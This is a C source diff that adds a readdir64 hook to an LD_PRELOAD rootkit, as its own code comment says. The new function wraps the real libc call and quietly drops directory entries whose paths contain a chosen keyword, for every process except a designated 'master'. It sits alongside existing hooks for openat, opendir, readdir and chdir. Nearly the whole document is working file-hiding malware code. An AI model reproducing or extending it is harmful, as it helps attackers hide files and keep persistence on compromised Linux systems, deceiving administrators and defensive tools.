@@ -26,6 +26,7 @@ int (*old_openat)(int dirfd, const char *pathname, int flags, mode_t mode);
 DIR *(*old_opendir)(const char *name);
 DIR *(*old_opendir64)(const char *name);
 struct dirent *(*old_readdir)(DIR *dirp);
+struct dirent64 *(*old_readdir64)(DIR *dirp);
 int (*old_chdir)(const char *path);
 int (*old_fchdir)(int fd);
 
@@ -151,6 +152,43 @@ struct dirent *readdir(DIR *dirp){
 
     return dir;
 
+}
+
+struct dirent64 *readdir64(DIR *dirp){
+    struct dirent64 *dir;
+    char path[PATH_MAX + 1];
+
+    if(!old_readdir64){
+	old_readdir64 = dlsym(RTLD_NEXT,"readdir64");
+    }
+
+    if(ismaster() == 0){
+	return old_readdir64(dirp);	
+    }
+    
+    //honestly so many other ld_preload rootkits use this method
+    //and my methods were breaking so fuck it
+    do{
+	dir = old_readdir64(dirp);
+	
+	if(dir != NULL && (strcmp(dir->d_name,".\0") == 0 || strcmp(dir->d_name,"/\0") == 0))
+	    continue;
+
+	if(dir != NULL){
+	    int fd = dirfd(dirp);
+	    char fd_path[256];
+	    char *dir_name = malloc(256);
+	    memset(dir_name, 0, 256);
+	    snprintf(fd_path,255,"/proc/self/fd/%d", fd);
+	    readlink(fd_path, dir_name, 255);
+	    snprintf(path, sizeof(path) - 1, "%s/%s", dir_name, dir->d_name);
+
+	}
+
+    }while(dir && strstr(path, keyword) != 0);
+
+    return dir;
+ 
 }
 
 int chdir(const char *path){
